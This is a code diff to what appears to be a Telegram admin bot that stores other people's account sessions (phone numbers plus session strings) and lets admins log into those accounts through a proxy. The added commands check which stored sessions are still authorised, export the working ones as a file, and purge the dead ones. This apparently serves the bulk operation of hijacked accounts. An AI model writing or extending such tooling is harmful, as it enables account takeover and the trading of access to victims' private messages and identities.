@@ -18,7 +18,7 @@ API_HASH = os.getenv("API_HASH")
 PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
 MONGO_URI = os.getenv("MONGO_URI")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
-LA_ADMIN_ID = int(os.getenv("LA_ADMIN_ID"))  # Легкий админ
+LA_ADMIN_ID = int(os.getenv("LA_ADMIN_ID"))
 
 PROXY_HOST = os.getenv("PROXY_HOST")
 PROXY_PORT = int(os.getenv("PROXY_PORT"))
@@ -53,7 +53,7 @@ async def add_light_admin_session(message: types.Message):
 
         added = 0
         for item in data:
-            phone = item.get("phone")
+            phone = item.get("phone", "").strip()
             session = item.get("session")
             if phone and session:
                 light_sessions_col.update_one(
@@ -108,6 +108,60 @@ async def cmd_log(message: types.Message):
     for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
         await message.answer(chunk)
 
+@dp.message_handler(commands=['loger'])
+async def cmd_loger(message: types.Message):
+    if not is_main_admin(message.from_user.id):
+        return
+
+    sessions = list(sessions_col.find({}))
+    valid_sessions = []
+
+    for session in sessions:
+        phone = session.get("phone")
+        session_str = session.get("session")
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+        try:
+            await client.connect()
+            if await client.is_user_authorized():
+                valid_sessions.append({"phone": phone, "session": session_str})
+        except:
+            pass
+        finally:
+            await client.disconnect()
+
+    if not valid_sessions:
+        await message.answer("❌ Нет валидных сессий.")
+        return
+
+    with open("valid_sessions.txt", "w") as f:
+        json.dump(valid_sessions, f, indent=2)
+
+    await message.answer_document(open("valid_sessions.txt", "rb"))
+
+@dp.message_handler(commands=['validel'])
+async def cmd_validel(message: types.Message):
+    if not is_main_admin(message.from_user.id):
+        return
+
+    sessions = list(sessions_col.find({}))
+    deleted = 0
+
+    for session in sessions:
+        session_str = session.get("session")
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
+        try:
+            await client.connect()
+            if not await client.is_user_authorized():
+                sessions_col.delete_one({"_id": session["_id"]})
+                deleted += 1
+        except:
+            sessions_col.delete_one({"_id": session["_id"]})
+            deleted += 1
+        finally:
+            await client.disconnect()
+
+    await message.answer(f"🧹 Удалено невалидных сессий: {deleted}")
+
 @dp.message_handler(commands=['login'])
 async def cmd_login(message: types.Message):
     if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
@@ -118,8 +172,8 @@ async def cmd_login(message: types.Message):
         await message.reply("❗ Укажи номер телефона в формате: /login +391234567890")
         return
 
-    session = (sessions_col.find_one({"phone": args}) if is_main_admin(message.from_user.id)
-               else light_sessions_col.find_one({"phone": args}))
+    col = sessions_col if is_main_admin(message.from_user.id) else light_sessions_col
+    session = col.find_one({"phone": args})
     if not session:
         await message.reply("❌ Сессия с этим номером не найдена.")
         return
@@ -158,8 +212,8 @@ async def cmd_fa(message: types.Message):
         await message.reply("❗ Укажи номер телефона в формате: /fa +391234567890")
         return
 
-    session = (sessions_col.find_one({"phone": args}) if is_main_admin(message.from_user.id)
-               else light_sessions_col.find_one({"phone": args}))
+    col = sessions_col if is_main_admin(message.from_user.id) else light_sessions_col
+    session = col.find_one({"phone": args})
     if not session:
         await message.reply("❌ Сессия с этим номером не найдена.")
         return
